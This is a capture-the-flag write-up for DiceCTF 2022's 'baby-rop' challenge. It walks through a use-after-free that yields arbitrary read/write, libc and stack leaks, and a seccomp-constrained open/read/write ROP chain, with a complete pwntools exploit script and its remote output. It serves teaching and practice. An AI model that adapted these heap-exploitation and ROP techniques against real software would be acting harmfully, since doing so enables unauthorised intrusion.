# DiceCTF 2022

## pwn/baby-rop

> this ROP tastes kinda funny...
> 
> `nc mc.ax 31245`
>
> Author: ireland
> 
> [`babyrop`](babyrop) [`ld-linux-x86-64.so.2`](ld-linux-x86-64.so.2) [`libc.so.6`](libc.so.6) [`uaf.c`](uaf.c) [`seccomp-bpf.h`](seccomp-bpf.h)

Tags: _pwn_ _x86-64_ _heap_ _uaf_ _rop_ _seccomp_ _write-what-where_


## Summary

Sure, "baby-rop", after some _baby-heap_.

The included source bears the name of the foothold, _UAF_--we'll start here.

In short, use UAF to control a pointer to first leak libc, then the stack, then to write out a seccomp constrained ROP chain.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE will make for easy libc leaks from the GOT.  Full RELRO, however, will prevent GOT writes.  No canary?  Well, this isn't BOF.


### Source Included

The two snippets below is all we need to know:

```c
    struct sock_filter filter[] = {
        VALIDATE_ARCHITECTURE,
        EXAMINE_SYSCALL,
        ALLOW_SYSCALL(mprotect),
        ALLOW_SYSCALL(mmap),
        ALLOW_SYSCALL(munmap),
        ALLOW_SYSCALL(exit_group),
        ALLOW_SYSCALL(read),
        ALLOW_SYSCALL(write),
        ALLOW_SYSCALL(open),
        ALLOW_SYSCALL(close),
        ALLOW_SYSCALL(openat),
        ALLOW_SYSCALL(fstat),
        ALLOW_SYSCALL(brk),
        ALLOW_SYSCALL(newfstatat),
        ALLOW_SYSCALL(ioctl),
        ALLOW_SYSCALL(lseek),
        KILL_PROCESS,
    };
```

The above is the seccomp filter.  Basically we're not getting a remote shell.  However `open`, `read`, and `write` is all we need to emit the flag.  There's some bonus items there as well like `mmap` and `mprotect` if you wanted to write some shellcode (but not _shell_ shellcode unless your code can mitigate seccomp :-).

```c
void free_safe_string(int i)
{
    safe_string *ptr = data_storage[i];
    free(ptr->string);
    free(ptr);
}
```

Use-After-Free (UAF).  The bug here is NOT resetting the pointers to NULL.  Given how the heap reuses freed space we can create new garbage for old pointers.

> There will be other write ups that cover mathematically exactly how this works, you may read terms like _fastbins_ or _tcachebins_ or _chunks_, etc... but not here, not today; we're going to write garbage, free garbage, and then write some more garbage and see what we can see.


### Dumpster Diving

If you read the code you'll notice we are limited to `10` strings.  Each string is represented by a malloc'd struct:

```
typedef struct {
    size_t length;
    char *string;
} safe_string;
```

`malloc` is called again to allocate space for the string.

In many of these type of CTF challenges you usually end up creating 10 or so allocations, freeing them, then creating a larger one that can write to previously allocated memory with pointers we want to control that have existing pointers pointing to them.  Which is precisely the case here:

```python
for i in range(10): create(i, 0x80, b'')
for i in range(10): free(i)
create(0, 0x100, cyclic(0x100))
```

The above code will:

* Allocate 10 `safe_string` structures on the heap.  Each pointing to a `0x80` byte string (also allocated on the heap).
* `free` all 10, however leaving the pointer array `data_storage` unchanged.
* Create another allocation at index 0 with a `0x100` byte string of cyclic garbage.  Existing pointers (`data_storage` in the BSS segment) from the first loop will pointing at some of our garbage.

> Details on this code is in the Exploit section below, for now, just go with it...

At this point, let's examine the heap from GDB:

```
gef➤  x/10g &data_storage
0x404040 <data_storage>:	0x5555557f7ae0	0x5555557f7770
0x404050 <data_storage+16>:	0x5555557f7820	0x5555557f78d0
0x404060 <data_storage+32>:	0x5555557f7980	0x5555557f7a30
0x404070 <data_storage+48>:	0x5555557f7ae0	0x5555557f7b90
0x404080 <data_storage+64>:	0x5555557f7c40	0x5555557f7cf0
```

`data_storage` is an array of pointers pointing to the allocated `safe_string` structs on the heap.  Because of the bug(s) not setting the pointers to `NULL` on `free`, we have 10 pointers we can explore.  The first (zeroth):

```
gef➤  x/2gx 0x5555557f7ae0
0x5555557f7ae0:	0x0000000000000100	0x00005555557f7b90
```

This looks correct for index 0.  The first 8 bytes is the size we requested in the `create(0, 0x100, cyclic(0x100))` statement.  The second 8 bytes is the pointer to the cyclic generated string:

> The astute may notice that the index 0 `string` pointer is pointing to the index 7 `safe_string` structure.

```
gef➤  x/1s 0x00005555557f7b90
0x5555557f7b90:	"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac"
```

Yep, looks like `cyclic` garbage to me.

What does index 1 look like?

```
gef➤  x/2gx 0x5555557f7770
0x5555557f7770:	0x00005550002a2137	0x0148e57812b2cf1f
```

Not our garbage.  Actually it looks like the results of the `free` operation.  You may want to explore the heap before and after the free loop to get a better understanding.

As we keep checking each struct one by one we'll eventually land on one (index 7 to be specific) with something that looks like ASCII:

```
gef➤  x/2gx 0x5555557f7b90
0x5555557f7b90:	0x6161616261616161	0x6161616461616163
gef➤  x/1s 0x5555557f7b90
0x5555557f7b90:	"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac"
```

Yeah, looks like our text, and at the beginning as well.  So, we can simply just write out an 8-byte length and an 8-byte address to index 0 as its `string`, and then use the program read and write menu options with index 7 to read and _write_ _what_ we want, _where_ we want.

That's all we really needed.  Next step would be to write out a size of `6` with `binary.got.puts` as the address, then read it from the program menu to leak libc.  With that in hand, do it again, but this time with `libc.sym.environ` to get a stack leak.  From there we can compute the distance in GDB from the environment to the return address on the stack.  And with that location known, well we just write out a ROP chain.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

def create(p, i, len, s):
    p.sendlineafter(b'command: ',b'C')
    p.sendlineafter(b'index: ',str(i).encode())
    p.sendlineafter(b'_string: ',str(len).encode())
    p.sendlineafter(b'string: ',s)

def free(p, i):
    p.sendlineafter(b'command: ',b'F')
    p.sendlineafter(b'index: ',str(i).encode())

def read(p, i):
    p.sendlineafter(b'command: ',b'R')
    p.sendlineafter(b'index: ',str(i).encode())
    p.recvuntil(b'hex')
    p.recvline()
    return (p.recvline().strip().decode())

def write(p, i, s):
    p.sendlineafter(b'command: ',b'W')
    p.sendlineafter(b'index: ',str(i).encode())
    p.sendlineafter(b'string: ',s)

def exit(p):
    p.sendlineafter(b'command: ',b'E')
    p.sendlineafter(b'index: ', b'0')
```

Above is just some functions to automated the program menu.  This should be fairly self-explanatory.

```python
binary = context.binary = ELF('./babyrop', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.log_level = 'INFO'

if args.REMOTE:
    p = remote('mc.ax', 31245)
    offset = 0x140 # guessing based on something close to 0x138 below (just test small offsets in either direction)
else:
    p = process([ld.path, binary.path], env={'LD_PRELOAD': libc.path})
    offset = 0x138 # used gdb to find
```

Above is mostly standard pwntools headers, however a bit more advanced since we need to use the provided `ld` and `libc`.

The `offset` is the distance from the `environ` location to the return address on the stack.  This was measured in GDB, however it was not the same for local and remote systems.  

> This is not uncommon.  If not exact, it is usually close, so I just test +/- 8, 16, etc... until I find it.  There may be a better way, but this usually works for me.

```python
for i in range(10): create(p, i, 0x80, b'')
for i in range(10): free(p, i)
```

This should look familiar (see Analysis section).

```python
payload  = b''
payload += p64(6)
payload += p64(binary.got.puts)

create(p, 0, 0x100, payload)
s = read(p, 7).split()[::-1]
libc.address = int('0x' + ''.join(s),16) - libc.sym.puts
log.info('libc.address: {x}'.format(x = hex(libc.address)))
```

Instead of writing out garbage like in the Analysis section we'll write out the size and location of `puts` from the GOT to index 0, and then read the libc leak from index 7.

```python
payload  = b''
payload += p64(6)
payload += p64(libc.sym.environ)

write(p, 0, payload)
s = read(p, 7).split()[::-1]
environ = int('0x' + ''.join(s),16)
log.info('environ: {x}'.format(x = hex(environ)))

# used gdb to find offset to return address
return_address = environ - offset
log.info('return_address: {x}'.format(x = hex(return_address)))
```

Same trick, but this time read the location of the environment from libc.  Using that we can compute the location of the return address on the stack.

```python
pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
pop_rsi = libc.search(asm('pop rsi; ret')).__next__()
pop_rdx_r12 = libc.search(asm('pop rdx; pop r12; ret')).__next__()
xchg_eax_edi = libc.search(asm('xchg eax, edi; ret')).__next__()

rop  = b''

rop += p64(pop_rdi)
rop += p64(return_address + 0x200) # will put flag.txt and end of our payload)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx_r12)
rop += 2 * p64(0)
rop += p64(libc.sym.open)

rop += p64(xchg_eax_edi)
rop += p64(pop_rsi)
rop += p64(return_address + 0x300) # scratch space down stack
rop += p64(pop_rdx_r12)
rop += p64(100) + p64(0)
rop += p64(libc.sym.read)

rop += p64(pop_rdi)
rop += p64(1) # stdout
rop += p64(pop_rsi)
rop += p64(return_address + 0x300) # scratch space down stack
rop += p64(pop_rdx_r12)
rop += p64(100) + p64(0)
rop += p64(libc.sym.write)

rop += cyclic(0x200 - len(rop))
rop += b'./flag.txt\0'

payload  = b''
payload += p64(len(rop))
payload += p64(return_address)

write(p, 0, payload)
write(p, 7, rop)
exit(p)

flag = p.recvuntil(b'}').decode()
p.close()
print(flag)
```

Finally, our ROP chain.  Since we have libc, we have all the gadgets we could ever need.

If you're wondering why `pop rdx; pop r12` vs. just `pop rdx`, well that code above to find gadgets is not very smart and will find in most glibcs `pop rdx` in a non-executable section.  So I usually search for `pop rdx; pop r12`.

The `xchg eax, edi` gadget is used to set `rdi` with the FD (`eax`) returned by `open`.

> _Why not use `mov`?_ Well, there's wasn't a simple gadget for that.

The ROP chain above has 3 sections, `open` [the flag], `read` [the flag and store down stack], `write` [the flag to stdout].

After the `open` call, the file descriptor (FD) needs to be passed to `read`, hence the `xchg`, however most of the time you can just hard code it to `3` or `4` depending on the challenge, but hard-coding sucks.

The `read` and `write` sections should be easy to understand.

Unsure of how long the ROP chain was going to be while developing it, so I set the flag file name to be `0x200` bytes down stack, then just appended to the ROP chain with cyclic padding.  Also down stack is the scratch space for storing the flag after `read`.

It's basically the same cycle as before, write to index 0 the length and address followed by a read or write using index 7.

Output:

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to mc.ax on port 31245: Done
[*] libc.address: 0x7fc52e593000
[*] environ: 0x7ffc4a1738a8
[*] return_address: 0x7ffc4a173768
[*] Closed connection to mc.ax port 31245
dice{glibc_2.34_stole_my_function_pointers-but_at_least_nobody_uses_intel_CET}
```

I have no idea what they are trying to tell me here.

_...googling..._

Ok, probably this:

```
* The deprecated memory allocation hooks __malloc_hook, __realloc_hook,
  __memalign_hook and __free_hook are now removed from the API.
```

> From the glibc 2.34 release notes.

The upside is we may be spared this year from lame _hook_ jokes.
